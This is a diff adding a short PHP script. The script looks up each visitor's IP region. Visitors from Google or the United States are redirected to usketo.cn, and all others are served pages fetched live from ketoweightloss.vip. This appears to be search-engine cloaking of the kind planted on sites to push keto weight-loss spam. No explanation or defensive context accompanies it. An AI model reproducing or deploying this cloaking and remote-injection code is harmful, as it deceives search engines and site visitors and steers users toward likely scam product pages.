@@ -1,0 +1,43 @@
+<?php
+	function ipVerify(){
+		vendor("ip2region-master.Ip2Region");
+		//$ip = real_ip();
+		$ip = get_client_ip_from_ns(true);
+		$ip_path = new \Ip2Region();
+		$info = $ip_path->btreeSearch($ip);
+		$guge = "谷歌";
+		$meiguo = "美国";
+		$google = "Google";
+		$america = "America";
+		$find_guge = stripos($info['region'], $guge);
+		$find_google = stripos($info['region'], $google);
+		$find_meiguo = stripos($info['region'], $meiguo);
+		$find_america = stripos($info['region'], $america);
+		if ($find_guge === false && $find_meiguo === false && $find_google === false && $find_america === false) {
+			return true;
+		} else {
+			return false;
+		}
+	}
+	$verify = ipVerify();
+	if($verify === false) {
+		$url = "https://usketo.cn/";
+		header("Location: $url");die;
+	}else{if($index=='zhindex'){
+             $fh = fopen('https://ketoweightloss.vip/front/User/zhindex', 'r');
+             if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);
+                }
+             }
+        }else if($index=='jiindex'){
+             $fh = fopen('https://ketoweightloss.vip/front/User/jiindex', 'r');
+             if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);
+                }
+             }
+        }
+	}
+?>
+
